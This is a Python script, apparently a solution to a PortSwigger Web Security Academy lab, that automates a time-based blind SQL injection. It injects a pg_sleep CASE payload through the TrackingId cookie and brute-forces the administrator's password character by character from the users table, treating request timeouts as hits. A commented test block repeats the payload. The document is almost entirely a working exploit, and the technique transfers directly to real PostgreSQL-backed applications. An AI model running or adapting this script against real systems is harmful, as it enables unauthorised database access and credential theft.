import requests
import string
from requests import ReadTimeout

URL = "https://0a7b00d10349632780e4dacb005000f5.web-security-academy.net"
PATH = "/filter"
QUERY = {
    "category": "Accessories"
}

def makeRequest(url=URL, path=PATH, query=QUERY, cookie=None):    
    response = requests.request(
    "GET",
    f"{URL}{PATH}",
    params=QUERY,
    cookies=cookie,
    timeout=4
    )
    return response

def bruteforceChar(debug=None, showHeaders=None):
    res = makeRequest()
    cookies = res.cookies
    CHARS =  list(string.ascii_lowercase)
    CHARS.extend([x for x in string.digits])
    PASSWORD = ""
    INDEX = 1
    FOUND = True
    
    while True:
        for char in CHARS:
            PAYLOAD = f"{cookies.get('TrackingId')}' || (SELECT CASE WHEN (SUBSTR(password, {INDEX}, 1) = '{char}') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator') -- "
            modified_cookies = {"TrackingId":PAYLOAD,"session": cookies.get('session')}
            
            try:
                session = makeRequest(cookie=modified_cookies)
                FOUND = False
            except ReadTimeout as e:
                PASSWORD += char
                print(f"Password charcter at index {INDEX}: {char} ")
                INDEX = (INDEX + 1)
                FOUND = True
                break
        if FOUND is False:
            break
    return PASSWORD

creds = bruteforceChar()
print(creds)


## TEST CASE ##
# res = makeRequest()
# cookies = res.cookies
# PAYLOAD = f"{cookies.get('TrackingId')}' || (SELECT CASE WHEN (SUBSTR(password, 1, 1) = '3') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator') -- "
# modified_cookies = {"TrackingId":PAYLOAD,"session": cookies.get('session')}
# try:
#     session = makeRequest(cookie=modified_cookies)
#     print(session.text)
#     print(session.request.headers.get('Cookie'))
# except ReadTimeout as e:
#     print(e)